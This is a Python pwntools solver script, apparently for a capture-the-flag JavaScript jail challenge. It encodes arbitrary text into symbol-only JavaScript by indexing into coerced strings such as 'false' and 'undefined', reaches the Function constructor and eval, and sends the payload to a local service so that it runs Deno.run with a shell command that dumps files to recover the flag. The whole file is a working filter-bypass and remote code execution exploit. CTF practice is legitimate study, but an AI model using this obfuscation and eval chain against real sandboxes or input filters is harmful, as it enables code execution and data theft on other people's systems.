from pwn import *
# credit to @orie, actualy he make this solver not me XD
import string
import re


keyword = {
    'object': '({}+0)',
    'undefined': '(0[0]+[])',
    'true': '(!0+[])',
    'false': '(!1+[])',
    'inf': '(1/0+[])',
    'string': '(``[({}+0)[5]+({}+0)[1]+(1/0+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(!0+[])[2]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])',
    'function': '([][(!1+[])[1]+(!0+[])[0]]+[])',
    'number': '(1[({}+0)[5]+({}+0)[1]+(1/0+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(!0+[])[2]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])',
    'fontcolor': '``[(!1+[])[0]+({}+0)[1]+(1/0+[])[1]+(!0+[])[0]+({}+0)[5]+({}+0)[1]+(!1+[])[2]+({}+0)[1]+(!0+[])[1]](`"`)',
    '20': '20[(!0+[])[0]+({}+0)[1]+(``[({}+0)[5]+({}+0)[1]+(0[0]+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(0[0]+[])[0]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])[9]+(!0+[])[0]+(!0+[])[1]+(1/0+[])[3]+(1/0+[])[1]+(``[({}+0)[5]+({}+0)[1]+(0[0]+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(0[0]+[])[0]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])[14]](21)',
    '32': '32[(!0+[])[0]+({}+0)[1]+(``[({}+0)[5]+({}+0)[1]+(0[0]+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(0[0]+[])[0]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])[9]+(!0+[])[0]+(!0+[])[1]+(1/0+[])[3]+(1/0+[])[1]+(``[({}+0)[5]+({}+0)[1]+(0[0]+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(0[0]+[])[0]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])[14]](33)',
    '35': '35[(!0+[])[0]+({}+0)[1]+(``[({}+0)[5]+({}+0)[1]+(0[0]+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(0[0]+[])[0]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])[9]+(!0+[])[0]+(!0+[])[1]+(1/0+[])[3]+(1/0+[])[1]+(``[({}+0)[5]+({}+0)[1]+(0[0]+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(0[0]+[])[0]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])[14]](36)',
    '101': '101[(!0+[])[0]+({}+0)[1]+(``[({}+0)[5]+({}+0)[1]+(0[0]+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(0[0]+[])[0]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])[9]+(!0+[])[0]+(!0+[])[1]+(1/0+[])[3]+(1/0+[])[1]+(``[({}+0)[5]+({}+0)[1]+(0[0]+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(0[0]+[])[0]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])[14]](21)',
    '101_': '101[(!0+[])[0]+({}+0)[1]+(``[({}+0)[5]+({}+0)[1]+(0[0]+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(0[0]+[])[0]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])[9]+(!0+[])[0]+(!0+[])[1]+(1/0+[])[3]+(1/0+[])[1]+(``[({}+0)[5]+({}+0)[1]+(0[0]+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(0[0]+[])[0]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])[14]](34)',
    '211': '211[(!0+[])[0]+({}+0)[1]+(``[({}+0)[5]+({}+0)[1]+(0[0]+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(0[0]+[])[0]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])[9]+(!0+[])[0]+(!0+[])[1]+(1/0+[])[3]+(1/0+[])[1]+(``[({}+0)[5]+({}+0)[1]+(0[0]+[])[1]+(!1+[])[3]+(!0+[])[0]+(!0+[])[1]+(0[0]+[])[0]+({}+0)[5]+(!0+[])[0]+({}+0)[1]+(!0+[])[1]]+[])[14]](31)',
}

uni_catalog = {c: f'u{hex(ord(c))[2:]:0>4}' if re.match('[A-Za-z]', c) else c for c in string.printable}
catalog = {
    'a': ('false', 1),
    'b': ('object', 2),
    'c': ('object', 5),
    'd': ('undefined', 2),
    'e': ('object', 4),
    'f': ('false', 0),
    'g': ('string', 14),
    'h': ('101', 1),
    'i': ('inf', 3),
    'j': ('object', 3),
    'k': ('20', 0),
    'l': ('false', 2),
    'm': ('number', 11),
    'n': ('inf', 1),
    'o': ('object', 1),
    'p': ('211', 1),
    'q': ('fontcolor', 14),
    'r': ('true', 1),
    's': ('false', 3),
    't': ('true', 0),
    'u': ('true', 2),
    'v': ('function', 21),
    'w': ('32', 0),
    'x': ('101_', 1),
    'y': ('inf', 7),
    'z': ('35', 0),
    'S': ('string', 9)
}
sub_catalog = {
    '[]': '$',
    '(!0+$)[2]': '_',
    '(1/0+$)[1]': '$$',
    '(!1+$)': '_$',
    '(!0+$)': '__',
    '({}+0)': '$_',
    '$_[5]': '$1',
    '(0[0]+$)[2]': '$2',
}


def get_substitution(text, unicode=False):
    result = []
    sep = '' if unicode else '+'

    for char in text:
        symbols = catalog.get(char, char)

        if not unicode:
            if isinstance(symbols, tuple):
                term, index = symbols
                result.append(f'{keyword[term]}[{index}]')
            else:
                result.append(f'`{char}`')
        elif symbols[0] in ['object', 'inf', 'true', 'false', 'undefined']:
            term, index = symbols
            result.append('${%s[%s]}' % (keyword[term], index))
        else:
            if re.match(f'[{re.escape(string.punctuation)}]', char):
                result.append(f'{char}')
            else:
                symbols = uni_catalog.get(char, char)
                for symbol in symbols:
                    if re.match('[\d ]', symbol):
                        result.append(symbol)
                    else:
                        term, index = catalog.get(symbol)

                        if symbol == 'u':
                            result.append('\\\\${_}')
                        else:
                            result.append('${%s[%s]}' % (keyword[term], index))

    result = sep.join(result)
    for k,v in sub_catalog.items():
        result = result.replace(k, v)

    return result

def exploit(command):
    fun = f'(()=>_)[{get_substitution("constructor")}]'
    eva = get_substitution('eval')
    cmd = '\\`%s\\`' % get_substitution(command, unicode=True)
    payload = f'(($=[],_$=(!1+$),__=(!0+$),_=__[2],$_=(\x7b\x7d+0),$$=(1/0+$)[1],$1=$_[5],$2=(0[0]+$)[2])=>{fun}({eva}+`({cmd})`)())()'

    r = remote('localhost', 52688, level='error')
    r.sendlineafter(b': ', payload.encode())

    return r.recvall().decode()

if __name__ == '__main__':
    flag = exploit("Deno.run({cmd:['sh','-c','od /*']})")
